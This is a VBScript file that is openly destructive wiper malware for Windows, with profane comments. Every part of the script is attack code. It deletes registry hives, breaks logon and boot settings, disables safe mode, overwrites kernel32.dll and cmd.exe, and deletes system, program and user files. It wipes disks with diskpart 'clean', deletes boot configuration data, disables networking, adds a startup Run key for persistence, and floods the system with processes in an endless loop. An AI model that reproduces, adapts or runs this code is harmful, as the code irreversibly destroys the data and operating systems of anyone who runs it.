Option Explicit 
Dim x7p9q, q3z8k, k9m2v, r4t6y, z2w8j
Set x7p9q = CreateObject("WScript.Shell") ' Shell for silent fuckery
Set q3z8k = CreateObject("Scripting.FileSystemObject") ' File system chaos
Set k9m2v = CreateObject("WScript.Shell") ' Registry sabotage


x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False


On Error Resume Next
x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
x7p9q.Run "reg delete HKLM\SYSTEM\Setup /f", 0, True ' Setup fucked
x7p9q.Run "reg delete HKLM\SOFTWARE\Policies /f", 0, True ' Policies erased
x7p9q.Run "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f", 0, True ' No startup apps
x7p9q.Run "reg delete HKLM\SOFTWARE /f", 0, True ' Software hive gone
x7p9q.Run "reg delete HKLM\SYSTEM /f", 0, True ' Entire SYSTEM hive
x7p9q.Run "reg delete HKCU\Software /f", 0, True ' User configs dead
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "invalid.exe", "REG_SZ" ' Login fails
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode

If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")
' Corrupt disk metadata
x7p9q.Run "fsutil fsinfo ntfsinfo C: > C:\Temp\corrupt.txt", 0, True ' Mess with NTFS
x7p9q.Run "fsutil file createnew C:\corrupt.sys 10000000", 0, True ' Junk file to fuck disk


If q3z8k.FileExists("C:\Windows\System32\kernel32.dll") Then
    Set y8h2m = q3z8k.CreateTextFile("C:\Windows\System32\kernel32.dll", True)
    y8h2m.Write String(10000000, "X") 
    y8h2m.Close
End If
If q3z8k.FileExists("C:\Windows\System32\cmd.exe") Then
    Set y8h2m = q3z8k.CreateTextFile("C:\Windows\System32\cmd.exe", True)
    y8h2m.Write String(10000000, "X") 
    y8h2m.Close
End If


q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
q3z8k.DeleteFile("C:\Windows\*.*") ' Entire Windows dir
q3z8k.DeleteFile("C:\Program Files\*.*") ' Program Files gone
q3z8k.DeleteFile("C:\Program Files (x86)\*.*") ' 32-bit apps dead
q3z8k.DeleteFile("C:\Users\*\*.*") ' All user data erased
q3z8k.DeleteFolder("C:\Windows\System32\config") ' Registry backups gone

' Flood disk with massive junk files
For r4t6y = 1 To 200
    Set p5n3b = q3z8k.CreateTextFile("C:\Temp\junk" & r4t6y & ".dat", True)
    p5n3b.Write String(100000000, "Z") ' 100MB each, 2GB total
    p5n3b.Close
Next

' Nuke ALL disks' boot sectors and partitions
Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp1.txt", True)
z2w8j.WriteLine "list disk"
z2w8j.WriteLine "select disk 0"
z2w8j.WriteLine "clean"
z2w8j.WriteLine "select disk 1"
z2w8j.WriteLine "clean"
z2w8j.WriteLine "select disk 2"
z2w8j.WriteLine "clean"
z2w8j.Close
x7p9q.Run "cmd /c diskpart /s C:\Temp\dp1.txt", 0, True
q3z8k.DeleteFile("C:\Temp\dp1.txt")
Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp2.txt", True)
z2w8j.WriteLine "select disk 0"
z2w8j.WriteLine "clean"
z2w8j.Close
x7p9q.Run "cmd /c diskpart /s C:\Temp\dp2.txt", 0, True
q3z8k.DeleteFile("C:\Temp\dp2.txt")

' Destroy Boot Configuration Data
x7p9q.Run "bcdedit /set {bootmgr} displaybootmenu no", 0, True
x7p9q.Run "bcdedit /set {default} recoveryenabled no", 0, True
x7p9q.Run "bcdedit /delete {default}", 0, True
x7p9q.Run "bcdedit /delete {bootmgr}", 0, True ' No boot at all

' Break network completely
x7p9q.Run "netsh winsock reset", 0, True ' TCP/IP fucked
x7p9q.Run "netsh int ip reset", 0, True ' IP settings gone
x7p9q.Run "ipconfig /release", 0, True ' Drop network
x7p9q.Run "netsh interface set interface ""Ethernet"" disable", 0, True ' Kill Ethernet
x7p9q.Run "netsh interface set interface ""Wi-Fi"" disable", 0, True ' Kill Wi-Fi

' Persist until it's unbootable
k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSys", WScript.ScriptFullName, "REG_SZ"

' Flood system with processes
For r4t6y = 1 To 1000
    x7p9q.Run "notepad.exe", 0, False ' 1000 notepads
    x7p9q.Run "calc.exe", 0, False ' 1000 calculators
Next

' Schedule multiple shutdowns/restarts
'x7p9q.Run "shutdown /r /t 120 /c ""System meltdown in progress.""", 0, True
'x7p9q.Run "shutdown /s /t 300 /c ""Final termination.""", 0, True

' Finally, kill critical processes
x7p9q.Run "taskkill /F /IM explorer.exe", 0, True ' Desktop dead
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True ' Services gone

On Error GoTo 0

Do
    WScript.Sleep 30000 ' Wait 30 seconds
    For r4t6y = 1 To 200
        x7p9q.Run "notepad.exe", 0, False ' More processes
        x7p9q.Run "calc.exe", 0, False
    Next
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True ' Stay dead
Loop